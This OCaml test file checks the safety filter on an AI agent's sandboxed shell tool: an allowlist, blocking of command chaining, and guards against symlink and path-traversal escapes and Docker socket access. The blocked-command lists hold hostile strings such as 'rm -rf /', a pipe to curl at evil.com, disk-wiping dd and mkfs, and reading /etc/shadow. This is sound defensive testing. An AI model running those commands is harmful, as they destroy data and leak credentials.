(** Tests that keeper_bash blocks dangerous commands via allowlist.

    Validates:
    1. Allowed commands (dune, git, rg, etc.) pass validation
    2. Dangerous commands (rm, curl, kill, etc.) are blocked
    3. Shell metacharacters (;, |, &, etc.) are rejected
    4. Empty commands are rejected *)

module Coord = Masc_mcp.Coord
module Config_boot_overrides = Config_boot_overrides
module Keeper_exec_shell = Masc_mcp.Keeper_exec_shell
module Keeper_registry = Masc_mcp.Keeper_registry
module Keeper_sandbox = Masc_mcp.Keeper_sandbox
module Keeper_types = Masc_mcp.Keeper_types
module Json = Yojson.Safe.Util

let validate = Masc_mcp.Worker_dev_tools.validate_command

let is_ok = function Ok () -> true | Error _ -> false
let is_error = function Error _ -> true | Ok () -> false
let error_msg = function Error m -> Masc_mcp.Worker_dev_tools.block_reason_to_string m | Ok () -> ""

let test_allowed_commands () =
  let allowed = [
    "dune build";
    "git status";
    "git log --oneline -5";
    "rg 'pattern' lib/";
    "make test";
    "python3 script.py";
    "npm run build";
    "pnpm run build";
    "cat README.md";
    "ls -la";
    "head -20 file.ml";
    "wc -l lib/*.ml";
    "opam install eio";
  ] in
  List.iter (fun cmd ->
    Alcotest.(check bool) (Printf.sprintf "allowed: %s" cmd) true (is_ok (validate cmd))
  ) allowed

let test_blocked_commands () =
  let blocked = [
    "rm -rf /";
    "rm file.txt";
    "curl https://evil.com";
    "wget http://example.com";
    "kill -9 1234";
    "killall main_eio.exe";
    "chmod 777 /etc/passwd";
    "chown root file";
    "sudo anything";
    "ssh user@host";
    "scp file user@host:";
    "dd if=/dev/zero of=/dev/sda";
    "mkfs.ext4 /dev/sda1";
    "shutdown -h now";
    "reboot";
  ] in
  List.iter (fun cmd ->
    Alcotest.(check bool)
      (Printf.sprintf "blocked: %s" cmd) true (is_error (validate cmd))
  ) blocked

let test_shell_metachar_blocked () =
  let chained = [
    "ls; rm -rf /";
    "cat file | curl http://evil.com";
    "echo x && rm -rf /";
    "cat file > /etc/passwd";
    "cat < /etc/shadow";
    "echo `whoami`";
    "echo $HOME";
  ] in
  List.iter (fun cmd ->
    let result = validate cmd in
    Alcotest.(check bool)
      (Printf.sprintf "metachar blocked: %s" cmd) true (is_error result);
    let msg = error_msg result in
    Alcotest.(check bool)
      "error mentions chaining" true
      (String.length msg > 0)
  ) chained

let test_empty_command () =
  Alcotest.(check bool) "empty blocked" true (is_error (validate ""));
  Alcotest.(check bool) "whitespace blocked" true (is_error (validate "   "))

let is_write = Masc_mcp.Worker_dev_tools.is_write_operation

let test_write_ops_detected () =
  let writes = [
    "git push origin main";
    "git commit -m 'msg'";
    "git merge feature";
    "git rebase main";
    "git reset --hard HEAD~1";
    "git checkout other-branch";
    "git stash pop";
    "git clone https://github.com/user/repo.git";
    "git init";
    "dune clean";
    "make deploy";
    "make install";
    "npm publish";
    "pnpm install";
    "pnpm publish";
    "mv file1 file2";
    "cp src dst";
    "mkdir newdir";
    "touch newfile";
    "chmod 755 script.sh";
  ] in
  List.iter (fun cmd ->
    Alcotest.(check bool) (Printf.sprintf "write: %s" cmd) true (is_write cmd)
  ) writes

let test_read_ops_pass () =
  let reads = [
    "git status";
    "git log --oneline -5";
    "git diff HEAD";
    "dune build";
    "dune exec test.exe";
    "make test";
    "npm run build";
    "npm run dev";
    "pnpm run build";
    "pnpm run dev";
    "rg pattern lib/";
    "cat file.ml";
    "ls -la";
    "head -20 file.ml";
    "python3 script.py";
  ] in
  List.iter (fun cmd ->
    Alcotest.(check bool) (Printf.sprintf "read: %s" cmd) false (is_write cmd)
  ) reads

(* ── rg exit code semantics ──────────────────────────────── *)

let test_rg_exit_code_semantics () =
  (* rg: 0=matches, 1=no matches (valid), 2+=error *)
  let is_ok st = st = Unix.WEXITED 0 || st = Unix.WEXITED 1 in
  Alcotest.(check bool) "exit 0 is ok" true (is_ok (Unix.WEXITED 0));
  Alcotest.(check bool) "exit 1 (no match) is ok" true (is_ok (Unix.WEXITED 1));
  Alcotest.(check bool) "exit 2 (error) is not ok" false (is_ok (Unix.WEXITED 2));
  Alcotest.(check bool) "exit 127 (not found) is not ok" false (is_ok (Unix.WEXITED 127))

(* ── git_worktree op: action validation ───────────────────── *)

let test_git_worktree_action_normalization () =
  (* Verify action aliases normalize correctly *)
  let normalize a = String.trim a |> String.lowercase_ascii in
  Alcotest.(check string) "list" "list" (normalize "list");
  Alcotest.(check string) "add" "add" (normalize " Add ");
  Alcotest.(check string) "LIST uppercase" "list" (normalize "LIST");
  Alcotest.(check string) "unknown stays" "remove" (normalize "remove")

let test_git_worktree_branch_required () =
  (* action=add with empty branch should be rejected *)
  let branch = String.trim "" in
  Alcotest.(check bool) "empty branch rejected" true (branch = "")

(* ── Playground path detection ──────────────────────────── *)

let playground_path_of = Masc_mcp.Keeper_alerting_path.playground_path_of_keeper

let normalize_path_for_containment path =
  Masc_mcp.Keeper_alerting_path.normalize_path_for_check path
  |> Masc_mcp.Keeper_alerting_path.strip_trailing_slashes

let temp_dir () =
  let dir = Filename.temp_file "keeper_bash_safety_" "" in
  Unix.unlink dir;
  Unix.mkdir dir 0o755;
  dir

let cleanup_dir dir =
  let rec rm path =
    match Unix.lstat path with
    | { Unix.st_kind = Unix.S_DIR; _ } ->
        Array.iter (fun name -> rm (Filename.concat path name)) (Sys.readdir path);
        Unix.rmdir path
    | _ ->
        Unix.unlink path
  in
  try rm dir with _ -> ()

let rec ensure_dir path =
  if path = "" || path = "." || path = "/" then ()
  else if Sys.file_exists path then ()
  else (
    let parent = Filename.dirname path in
    if parent <> path then ensure_dir parent;
    Unix.mkdir path 0o755)

let test_playground_path_structure () =
  (* playground_path_of_keeper returns relative path ending with / *)
  Alcotest.(check string) "cheolsu"
    ".masc/playground/cheolsu/" (playground_path_of "cheolsu");
  Alcotest.(check string) "masc-improver"
    ".masc/playground/masc-improver/" (playground_path_of "masc-improver")

let is_inside_playground ~playground_abs cwd =
  let playground_abs = normalize_path_for_containment playground_abs in
  let cwd = normalize_path_for_containment cwd in
  String.starts_with ~prefix:(playground_abs ^ "/") (cwd ^ "/")
  || String.equal playground_abs cwd

let test_playground_guard_inside () =
  let pg = "/project/.masc/playground/cheolsu" in
  (* Inside playground: various depths *)
  Alcotest.(check bool) "exact playground dir"
    true (is_inside_playground ~playground_abs:pg pg);
  Alcotest.(check bool) "repos subdir"
    true (is_inside_playground ~playground_abs:pg (pg ^ "/repos/masc-mcp"));
  Alcotest.(check bool) "deep nested"
    true (is_inside_playground ~playground_abs:pg (pg ^ "/repos/masc-mcp/lib/keeper"))

let test_playground_guard_outside () =
  let pg = "/project/.masc/playground/cheolsu" in
  (* Outside playground: main repo and other keepers *)
  Alcotest.(check bool) "project root"
    false (is_inside_playground ~playground_abs:pg "/project");
  Alcotest.(check bool) "project lib"
    false (is_inside_playground ~playground_abs:pg "/project/lib/keeper");
  Alcotest.(check bool) "other keeper playground"
    false (is_inside_playground ~playground_abs:pg "/project/.masc/playground/sangsu");
  Alcotest.(check bool) "playground parent"
    false (is_inside_playground ~playground_abs:pg "/project/.masc/playground");
  (* Prefix attack: cheolsu2 should not match cheolsu *)
  Alcotest.(check bool) "prefix attack (cheolsu2)"
    false (is_inside_playground ~playground_abs:pg (pg ^ "2/repos"))

let test_playground_guard_trailing_slash () =
  let pg = "/project/.masc/playground/cheolsu/" in
  Alcotest.(check bool) "trailing slash exact match"
    true (is_inside_playground ~playground_abs:pg "/project/.masc/playground/cheolsu");
  Alcotest.(check bool) "trailing slash nested match"
    true
    (is_inside_playground ~playground_abs:pg
       "/project/.masc/playground/cheolsu/repos/masc-mcp")

let test_playground_guard_symlink_escape () =
  let base = temp_dir () in
  Fun.protect ~finally:(fun () -> cleanup_dir base) @@ fun () ->
  let playground = Filename.concat base ".masc/playground/cheolsu" in
  let repo_root = Filename.concat playground "repos" in
  let outside = Filename.concat base "outside" in
  let symlinked_cwd = Filename.concat repo_root "escape" in
  ensure_dir repo_root;
  ensure_dir outside;
  Unix.symlink outside symlinked_cwd;
  Alcotest.(check bool) "symlinked cwd resolving outside is rejected"
    false (is_inside_playground ~playground_abs:playground symlinked_cwd)

let test_cleanup_dir_does_not_follow_symlinks () =
  let root = temp_dir () in
  Fun.protect ~finally:(fun () -> cleanup_dir root) @@ fun () ->
  let base = Filename.concat root "base" in
  let outside = Filename.concat root "outside" in
  let marker = Filename.concat outside "marker.txt" in
  let link = Filename.concat base "escape" in
  ensure_dir base;
  ensure_dir outside;
  let oc = open_out marker in
  output_string oc "keep me";
  close_out oc;
  Unix.symlink outside link;
  cleanup_dir base;
  Alcotest.(check bool) "cleanup removed base dir" false (Sys.file_exists base);
  Alcotest.(check bool) "outside target preserved" true (Sys.file_exists marker)

let make_config () =
  let tmp = temp_dir () in
  ensure_dir (Filename.concat tmp ".masc");
  (tmp, Coord.default_config tmp)

let make_docker_meta name =
  let json =
    `Assoc
      [
        ("name", `String name);
        ("agent_name", `String ("agent-" ^ name));
        ("trace_id", `String ("trace-" ^ name));
        ("goal", `String "sandbox test");
        ("sandbox_profile", `String "docker");
        ("network_mode", `String "none");
      ]
  in
  match Keeper_types.meta_of_json json with
  | Ok meta -> meta
  | Error err -> Alcotest.fail ("make_docker_meta failed: " ^ err)

let with_eio_fs f =
  Eio_main.run @@ fun env ->
  Fs_compat.set_fs (Eio.Stdenv.fs env);
  f ()

let with_boot_override name value f =
  let previous = Config_boot_overrides.get_opt name in
  Config_boot_overrides.set name value;
  Fun.protect ~finally:(fun () ->
    match previous with
    | Some v -> Config_boot_overrides.set name v
    | None -> Config_boot_overrides.clear name) f

let parse_error_field raw =
  Yojson.Safe.from_string raw
  |> Json.member "error"
  |> Json.to_string_option

let test_docker_blocks_nested_docker_command () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  let meta = make_docker_meta "docker-nested" in
  let raw =
    Keeper_exec_shell.handle_keeper_bash
      ~turn_sandbox_runtime:None
      ~config ~meta
      ~args:(`Assoc [ ("cmd", `String "docker run --rm alpine true") ]) ()
  in
  match parse_error_field raw with
  | Some err ->
      Alcotest.(check bool) "mentions nested container block" true
        (String_util.contains_substring err
           "blocks nested container runtimes and host socket references")
  | None ->
      Alcotest.fail ("expected error json, got: " ^ raw)

let test_docker_blocks_docker_socket_reference () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  let meta = make_docker_meta "docker-sock" in
  let raw =
    Keeper_exec_shell.handle_keeper_bash
      ~turn_sandbox_runtime:None
      ~config ~meta
      ~args:(`Assoc [ ("cmd", `String "cat /var/run/docker.sock") ]) ()
  in
  match parse_error_field raw with
  | Some err ->
      Alcotest.(check bool) "mentions socket block" true
        (String_util.contains_substring err
           "blocks nested container runtimes and host socket references")
  | None ->
      Alcotest.fail ("expected error json, got: " ^ raw)

let test_docker_missing_seccomp_profile_fails_closed () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  let meta = make_docker_meta "missing-seccomp" in
  with_boot_override "MASC_KEEPER_SANDBOX_SECCOMP_PROFILE"
    (Filename.concat base_path "missing-seccomp-profile.json")
    (fun () ->
      let raw =
        Keeper_exec_shell.handle_keeper_bash
          ~turn_sandbox_runtime:None
          ~config ~meta
          ~args:(`Assoc [ ("cmd", `String "pwd") ]) ()
      in
      match parse_error_field raw with
      | Some err ->
          Alcotest.(check bool) "mentions missing seccomp profile" true
            (String_util.contains_substring err
               "sandbox seccomp profile not found")
      | None ->
          Alcotest.fail ("expected error json, got: " ^ raw))

(** Path traversal: if cwd is canonicalized via realpath before the check,
    ../traversal resolves to the actual target. This test verifies that
    a canonicalized traversal path is correctly rejected.
    In production, Unix.realpath on the cwd collapses ".." before comparison. *)
let test_playground_guard_traversal () =
  let pg = "/project/.masc/playground/cheolsu" in
  (* After realpath, ".../cheolsu/repos/../../lib" becomes "/project/lib" *)
  Alcotest.(check bool) "traversal resolves outside (canonicalized)"
    false (is_inside_playground ~playground_abs:pg "/project/lib");
  (* After realpath, ".../cheolsu/repos/../../../.masc" becomes "/project/.masc" *)
  Alcotest.(check bool) "traversal to .masc (canonicalized)"
    false (is_inside_playground ~playground_abs:pg "/project/.masc");
  (* The raw non-canonical form would match the prefix — this proves
     we MUST canonicalize before checking *)
  let raw_traversal = pg ^ "/repos/masc-mcp/../../../../../../lib" in
  let would_match_raw = String.starts_with ~prefix:(pg ^ "/") raw_traversal in
  Alcotest.(check bool) "raw traversal WOULD match prefix (proves canonicalization needed)"
    true would_match_raw

(* ── keeper_shell readonly hints teach the model about alternatives ───── *)

let make_readonly_meta name =
  let json =
    `Assoc
      [
        ("name", `String name);
        ("agent_name", `String ("agent-" ^ name));
        ("trace_id", `String ("trace-" ^ name));
        ("goal", `String "readonly hint test");
      ]
  in
  match Keeper_types.meta_of_json json with
  | Ok meta -> meta
  | Error err -> Alcotest.fail ("make_readonly_meta failed: " ^ err)

let parse_hint raw =
  Yojson.Safe.from_string raw
  |> Json.member "hint"
  |> Json.to_string_option

let parse_category raw =
  Yojson.Safe.from_string raw
  |> Json.member "category"
  |> Json.to_string_option

let test_keeper_shell_ls_recovers_doubled_playground_prefix () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  let meta = make_readonly_meta "masc-improver" in
  let playground =
    Filename.concat base_path (playground_path_of meta.name)
  in
  let repos = Filename.concat playground "repos" in
  ensure_dir repos;
  ignore (Fs_compat.save_file_atomic (Filename.concat repos "demo.txt") "ok");
  let doubled_path =
    Filename.concat playground ((playground_path_of meta.name) ^ "repos")
  in
  let raw =
    Keeper_exec_shell.handle_keeper_shell
      ~turn_sandbox_runtime:None
      ~config ~meta
      ~args:(`Assoc [
        ("op", `String "ls");
        ("path", `String doubled_path);
      ])
  in
  let json = Yojson.Safe.from_string raw in
  Alcotest.(check bool) "ls succeeds" true
    (json |> Json.member "ok" |> Json.to_bool);
  Alcotest.(check string) "path normalized to repos root" repos
    (json |> Json.member "path" |> Json.to_string)

(* task-238: terse "X blocked" error caused model retry loops. Hint must
   redirect the model to either separate calls or a specific sub-op. *)
let test_readonly_chaining_hint_lists_subops () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  let meta = make_readonly_meta "chain-hint" in
  let raw =
    Keeper_exec_shell.handle_keeper_shell
      ~turn_sandbox_runtime:None
      ~config ~meta
      ~args:(`Assoc [
        ("op", `String "bash");
        ("command", `String "git status && git log --oneline -5");
      ])
  in
  Alcotest.(check (option string)) "category is chaining"
    (Some "chaining") (parse_category raw);
  (match parse_hint raw with
   | None -> Alcotest.fail ("expected hint field, got: " ^ raw)
   | Some hint ->
     Alcotest.(check bool) "hint names the separate-call alternative" true
       (String_util.contains_substring hint "one command per keeper_shell call");
     (* A concrete list of sub-ops prevents the model from guessing. *)
     List.iter (fun sub_op ->
       Alcotest.(check bool)
         (Printf.sprintf "hint lists %s sub-op" sub_op) true
         (String_util.contains_substring hint sub_op)
     ) [ "git_log"; "git_status"; "git_diff"; "rg"; "ls"; "cat" ])

let test_readonly_redirect_hint_points_at_fs_edit () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  let meta = make_readonly_meta "redirect-hint" in
  let raw =
    Keeper_exec_shell.handle_keeper_shell
      ~turn_sandbox_runtime:None
      ~config ~meta
      ~args:(`Assoc [
        ("op", `String "bash");
        ("command", `String "echo hi > out.txt");
      ])
  in
  Alcotest.(check (option string)) "category is redirect"
    (Some "redirect") (parse_category raw);
  match parse_hint raw with
  | None -> Alcotest.fail ("expected hint field, got: " ^ raw)
  | Some hint ->
    Alcotest.(check bool) "hint mentions keeper_fs_edit" true
      (String_util.contains_substring hint "keeper_fs_edit")

let test_git_write_classification () =
  let is_branch_switch = Masc_mcp.Worker_dev_tools.is_git_branch_switch in
  let is_destructive = Masc_mcp.Worker_dev_tools.is_destructive_bash_operation in
  (* git checkout: branch switch, allowed in playground *)
  Alcotest.(check bool) "checkout is branch switch"
    true (is_branch_switch "git checkout -b my-feature");
  Alcotest.(check bool) "switch is branch switch"
    true (is_branch_switch "git switch -c my-feature");
  (* git push: write op, allowed in playground *)
  Alcotest.(check bool) "push is write" true (is_write "git push origin my-branch");
  Alcotest.(check bool) "commit is write" true (is_write "git commit -m 'msg'");
  (* destructive: blocked everywhere including playground *)
  Alcotest.(check bool) "rm -rf is destructive"
    true (is_destructive "rm -rf /tmp/something");
  (* git push is NOT destructive (it's write, not destructive) *)
  Alcotest.(check bool) "push is not destructive"
    false (is_destructive "git push origin my-branch")

let test_rewrite_turn_runtime_paths_to_host () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  let meta = make_docker_meta "minjae" in
  let container_root = Keeper_sandbox.container_root meta.name in
  let host_root = Keeper_sandbox.host_root_abs_of_meta ~config meta in
  let input =
    Printf.sprintf "worktree %s/repos/masc-mcp\npwd=%s/repos/masc-mcp\n"
      container_root container_root
  in
  let rewritten =
    Keeper_exec_shell.rewrite_turn_runtime_paths_to_host ~config ~meta input
  in
  Alcotest.(check string) "container paths rewritten to host root"
    (Printf.sprintf "worktree %s/repos/masc-mcp\npwd=%s/repos/masc-mcp\n"
       host_root host_root)
    rewritten

let test_rewrite_turn_runtime_paths_to_host_is_noop_without_container_path () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  let meta = make_docker_meta "minjae" in
  let input = "worktree /tmp/other\n" in
  Alcotest.(check string) "unrelated paths untouched" input
    (Keeper_exec_shell.rewrite_turn_runtime_paths_to_host ~config ~meta input)

let () =
  Alcotest.run "Keeper bash safety" [
    ("allowlist", [
      Alcotest.test_case "allowed dev commands pass" `Quick test_allowed_commands;
      Alcotest.test_case "dangerous commands blocked" `Quick test_blocked_commands;
    ]);
    ("metachar", [
      Alcotest.test_case "shell metacharacters blocked" `Quick test_shell_metachar_blocked;
    ]);
    ("write_gate", [
      Alcotest.test_case "write operations detected" `Quick test_write_ops_detected;
      Alcotest.test_case "read operations pass" `Quick test_read_ops_pass;
    ]);
    ("playground_guard", [
      Alcotest.test_case "playground path structure" `Quick test_playground_path_structure;
      Alcotest.test_case "inside playground detected" `Quick test_playground_guard_inside;
      Alcotest.test_case "outside playground rejected" `Quick test_playground_guard_outside;
      Alcotest.test_case "trailing slash normalized" `Quick test_playground_guard_trailing_slash;
      Alcotest.test_case "symlink escape rejected" `Quick test_playground_guard_symlink_escape;
      Alcotest.test_case "cleanup does not follow symlinks" `Quick
        test_cleanup_dir_does_not_follow_symlinks;
      Alcotest.test_case "path traversal blocked after canonicalization" `Quick test_playground_guard_traversal;
      Alcotest.test_case "git write classification" `Quick test_git_write_classification;
    ]);
    ("edge", [
      Alcotest.test_case "empty command blocked" `Quick test_empty_command;
      Alcotest.test_case "docker blocks nested docker command" `Quick
        test_docker_blocks_nested_docker_command;
      Alcotest.test_case "docker blocks docker socket reference" `Quick
        test_docker_blocks_docker_socket_reference;
      Alcotest.test_case "docker missing seccomp fails closed" `Quick
        test_docker_missing_seccomp_profile_fails_closed;
    ]);
    ("readonly_hints", [
      Alcotest.test_case "doubled playground prefix auto-recovers" `Quick
        test_keeper_shell_ls_recovers_doubled_playground_prefix;
      Alcotest.test_case "chaining hint lists sub-ops (task-238)" `Quick
        test_readonly_chaining_hint_lists_subops;
      Alcotest.test_case "redirect hint points at keeper_fs_edit" `Quick
        test_readonly_redirect_hint_points_at_fs_edit;
    ]);
    ("rg_exit_code", [
      Alcotest.test_case "rg exit semantics (0=ok, 1=ok, 2+=error)" `Quick test_rg_exit_code_semantics;
    ]);
    ("git_worktree_op", [
      Alcotest.test_case "action normalization" `Quick test_git_worktree_action_normalization;
      Alcotest.test_case "branch required for add" `Quick test_git_worktree_branch_required;
    ]);
    ("turn_runtime_paths", [
      Alcotest.test_case "container paths rewrite to host paths" `Quick
        test_rewrite_turn_runtime_paths_to_host;
      Alcotest.test_case "unrelated paths remain unchanged" `Quick
        test_rewrite_turn_runtime_paths_to_host_is_noop_without_container_path;
    ]);
  ]
